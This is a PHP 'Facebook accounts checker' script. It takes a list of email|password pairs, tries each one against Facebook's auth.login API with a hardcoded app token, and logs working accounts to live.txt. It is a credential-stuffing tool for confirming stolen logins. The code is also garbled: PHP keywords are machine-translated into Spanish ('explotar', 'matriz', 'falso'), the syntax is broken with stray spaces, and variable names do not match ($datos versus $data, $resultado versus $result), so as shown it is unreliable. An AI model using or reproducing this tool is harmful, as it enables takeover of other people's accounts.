Al <? php
/ **
* @autor Rifqi Haidar
* @license licencia MIT
* @link https://github.com/rifqihaidar/Facebook-Accounts-Checker
 * /
if ( isset ( $ argv [ 1 ])) {
    if ( file_exists ( $ argv [ 1 ])) {
        $ ambil  =  explode ( PHP_EOL , file_get_contents ( $ argv [ 1 ]));
        foreach ( $ ambil  as  $ objetivos ) {
            $ potong  =  explotar ( " | " , $ objetivos );
            cekAkunFb ( $ potong [ 0 ], $ potong [ 1 ]);
        }
    } else  die ( "¡El archivo no existe! " );
} else  die ( " Uso: php check.php targets.txt " );
function  cekAkunFb ( $ email , $ passwd ) {
    $ datos  =  matriz (
        " access_token "  =>  " 350685531728 | 62f8ce9f74b12f84c123cc23437a4a32 " ,
        " email "  =>  $ email ,
        " contraseña "  =>  $ passwd ,
        " locale "  =>  " en_US " ,
        " formato "  =>  " JSON "
    );
    $ sig  =  " " ;
    foreach ( $ datos  como  $ clave  =>  $ valor ) { $ sig  . =  $ clave . " = " . $ valor ; }
    $ sig  =  md5 ( $ sig );
    $ data [ ' sig ' ] =  $ sig ;
    $ ch  =  curl_init ( " https://api.facebook.com/method/auth.login " );
    curl_setopt ( $ ch , CURLOPT_POST , true );
    curl_setopt ( $ ch , CURLOPT_POSTFIELDS , $ data );
    curl_setopt ( $ ch , CURLOPT_RETURNTRANSFER , true );
    curl_setopt ( $ ch , CURLOPT_SSL_VERIFYPEER , falso );
    curl_setopt ( $ ch , CURLOPT_USERAGENT , " Opera / 9.80 (Serie 60; Opera Mini / 7.0.32400 / 28.3445; U; en) Presto / 2.8.119 Versión / 11.10 " );
    $ resultado  =  json_decode ( curl_exec ( $ ch ));
    $ empas  =  $ email . " | " . $ passwd ;
    if ( isset ( $ result -> access_token )) {
        echo  $ empas . " -> EN VIVO " . PHP_EOL ;
        file_put_contents ( " live.txt " , $ empas . PHP_EOL , FILE_APPEND );
    } elseif ( $ resultado -> error_code  ==  405  ||  preg_match ( "/ El usuario debe verificar su cuenta / i" , $ resultado -> error_msg )) {
        echo  $ empas . " -> PUNTO DE CONTROL " . PHP_EOL ;
        file_put_contents ( " checkpoint.txt " , $ empas . PHP_EOL , FILE_APPEND );
    } else  echo  $ empas . " -> MUERTO " . PHP_EOL ;
}
